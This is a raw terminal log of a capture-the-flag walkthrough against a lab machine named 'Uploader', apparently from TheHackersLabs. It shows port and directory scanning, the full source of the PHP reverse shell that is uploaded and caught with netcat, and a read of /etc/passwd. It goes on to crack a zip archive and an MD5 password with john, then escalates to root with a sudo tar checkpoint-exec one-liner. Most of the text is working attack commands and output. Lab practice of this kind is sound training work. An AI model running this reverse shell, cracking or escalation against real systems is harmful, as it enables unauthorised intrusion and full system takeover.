┌──(kali㉿kali)-[~/Documents/uploader]
└─$ nmap -sS -p- --open --min-rate 5000 -n -Pn 10.0.250.9 -oN scan.txt                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 15:16 EDT
Nmap scan report for 10.0.250.9
Host is up (0.00014s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:B1:B6:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds

=============================================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/uploader]
└─$  nmap -p80 -sCV -vvv -Pn -n 10.0.250.9 -oN fullscan.txt 

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 15:17 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Initiating ARP Ping Scan at 15:17
Scanning 10.0.250.9 [1 port]
Completed ARP Ping Scan at 15:17, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:17
Scanning 10.0.250.9 [1 port]
Discovered open port 80/tcp on 10.0.250.9
Completed SYN Stealth Scan at 15:17, 0.02s elapsed (1 total ports)
Initiating Service scan at 15:17
Scanning 1 service on 10.0.250.9
Completed Service scan at 15:17, 6.06s elapsed (1 service on 1 host)
NSE: Script scanning 10.0.250.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.19s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Nmap scan report for 10.0.250.9
Host is up, received arp-response (0.00042s latency).
Scanned at 2025-09-19 15:17:25 EDT for 7s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Uploader File Storage
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 08:00:27:B1:B6:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)

=============================================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/uploader]
└─$ gobuster dir -u http://10.0.250.9 -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404
===============================================================

/index.html           (Status: 200) [Size: 3968]
/uploads              (Status: 301) [Size: 310] [--> http://10.0.250.9/uploads/]
/upload.php           (Status: 200) [Size: 3277]

=============================================================================================================================================================================================




┌──(kali㉿kali)-[~/Documents/uploader]
└─$ cat /usr/share/webshells/php/php-reverse-shell.php 
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 



                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.php
                                                                                                                                                                                                              
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader]
└─$ nano php-reverse-shell.php 

=============================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/uploader]
└─$ nc -lvnp 1234
listening on [any] 1234 ...




=============================================================================================================================================================================================

http://10.0.250.9/


http://10.0.250.9/uploads


http://10.0.250.9/uploads/cloud_1316cf/php-reverse-shell.php


=============================================================================================================================================================================================




Linux TheHackersLabs-Operator 6.8.0-71-generic #71-Ubuntu SMP PREEMPT_DYNAMIC Tue Jul 22 16:52:38 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 19:26:37 up 13 min,  0 user,  load average: 1.71, 0.38, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
operatorx:x:1000:1000:operator:/home/operatorx:/bin/bash


$ cd /home
$ ls
Readme.txt
operatorx

$ cat Readme.txt
He guardado mi archivo zip más importante en un lugar secreto.  
=============================================================================================================================================================================================

$ whoami
www-data
$ cd srv
$ cd secret
$ ls
File.zip

=============================================================================================================================================================================================

$ python3 -m http.server 8080
10.0.250.5 - - [19/Sep/2025 20:13:05] "GET /File.zip HTTP/1.1" 200 -






──(kali㉿kali)-[~/Documents/uploader]
└─$ wget http://10.0.250.9:8080/File.zip
--2025-09-19 16:13:06--  http://10.0.250.9:8080/File.zip
Connecting to 10.0.250.9:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 430 [application/zip]
Saving to: ‘File.zip’

File.zip                                            100%[=================================================================================================================>]     430  --.-KB/s    in 0s      

2025-09-19 16:13:06 (3.07 MB/s) - ‘File.zip’ saved [430/430]


┌──(kali㉿kali)-[~/Documents/uploader]
└─$ ls
File.zip  fullscan.txt  php-reverse-shell.php  scan.txt


=============================================================================================================================================================================================
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader]
└─$ zip2john File.zip > hash.txt
ver 2.0 File.zip/Credentials/ is not encrypted, or stored with non-handled compression type
                                                                                                                                                                                                              

                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader]
└─$ cat hash.txt                 
File.zip/Credentials/Credentials.txt:$zip2$*0*1*0*03b3feaba7e84510*b86b*40*889fd9803132d3fa91c9c997eefb39069fd9920af7b693d59bcc34ebe3f5e72a5b1ebdf582d72d4d7182e2945eba41a3fb169c2a1c8f1efe023d3a4bf1f9a4d8*c0294a7ec60b818784f9*$/zip2$:Credentials/Credentials.txt:File.zip:File.zip


┌──(kali㉿kali)-[~/Documents/uploader]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 64 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
121288           (File.zip/Credentials/Credentials.txt)     
1g 0:00:00:00 DONE (2025-09-19 16:15) 4.166g/s 34133p/s 34133c/s 34133C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


┌──(kali㉿kali)-[~/Documents/uploader]
└─$ ls
Credentials  File.zip  fullscan.txt  hash  hash.txt  php-reverse-shell.php  scan.txt
                                                                                                                                                                                                              
                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Documents/uploader]
└─$ cd Credentials 
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader/Credentials (2)]
└─$ ls
Credentials.txt
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader/Credentials (2)]
└─$ cat Credentials.txt  
User: operatorx
       
Password: d0970714757783e6cf17b26fb8e2298f

=============================================================================================================================================================================================



┌──(kali㉿kali)-[~/Documents/uploader/Credentials (2)]
└─$ ls
Credentials.txt
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader/Credentials (2)]
└─$ john --format=raw-md5 --wordlist=/path/to/wordlist.txt Credentials.txt 

Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader/Credentials (2)]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt Credentials.txt 

Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader/Credentials (2)]
└─$ cat Credentials.txt
User: operatorx
       
Password: d0970714757783e6cf17b26fb8e2298f


 =============================================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ python3 debug3: obfuscate_keystroke_timing: stopping: chaff time expired (409 chaff packets sent)
debug3: obfuscate_keystroke_timing: starting: interval ~20ms
 gohash.py                                    pygettext2                                    pyi-set_version                               python2.7                                   


     ██████╗  ██████╗       ██╗  ██╗ █████╗ ███████╗██╗  ██╗
    ██╔════╝ ██╔═══██╗      ██║  ██║██╔══██╗██╔════╝██║  ██║
    ██║  ███╗██║   ██║█████╗███████║███████║███████╗███████║
    ██║   ██║██║   ██║╚════╝██╔══██║██╔══██║╚════██║██╔══██║
    ╚██████╔╝╚██████╔╝      ██║  ██║██║  ██║███████║██║  ██║
     ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
            <<------ C O D E   B Y   H U N X ------>>
                       < Hash identified >

  [+] Enter Your Hash : debug3: obfuscate_keystroke_timing: stopping: chaff time expired (187 chaff packets sent)
debug3: obfuscate_keystroke_timing: starting: interval ~20ms                                                                                                                                                  
d0970714757783e6cf17b26fb8e2298f                                                                                                                                                                              
debug3: obfuscate_keystroke_timing: stopping: chaff time expired (160 chaff packets sent)                                                                                                                     
                                                                                                                                                                                                              
  ===================== Show Algorithm Hash ====================                                                                                                                                              
                                                                                                                                                                                                              
  [+] Hash : d0970714757783e6cf17b26fb8e2298f                                                                                                                                                                 
  [+] Algorithm : MD5                                                                                                                                                                                         
                                                                                                                                                                                                              
  ==============================================================                                                                                                                                              
                                                                           
=============================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/uploader/Credentials (2)]
└─$ nano hash.txt                                                     
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/uploader/Credentials (2)]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt       
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
112233           (?)     
1g 0:00:00:00 DONE (2025-09-19 16:24) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                              


=============================================================================================================================================================================================

$ su operatorx
Password: 112233
ls
operatorx
Readme.txt
whoami
operatorx


=============================================================================================================================================================================================

cd operatorx
ls
user.txt

cat user.txt
4a8b1c3d9e2f7a6b5c8d3e1f2a7b6c9d

=============================================================================================================================================================================================

sudo -l
Matching Defaults entries for operatorx on TheHackersLabs-Operator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operatorx may run the following commands on TheHackersLabs-Operator:
    (ALL) NOPASSWD: /usr/bin/tar

=============================================================================================================================================================================================

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh


whoami
root
ls

cd /root
ls
Congrats.txt
root.txt

=============================================================================================================================================================================================

cat root.txt
e1f9c2e8a1d8477f9b3f6cd298f9f3bd


=============================================================================================================================================================================================

cat Congrats.txt

#########################################################
#    !FELICITACIONES!                                   #
#                                                       #
#    Has logrado escalar privilegios                    #
#    y obtener acceso root en la maquina Uploader.      #
#                                                       # 
#  A seguir aprendiendo con mas maquinas y practicando. #
#########################################################

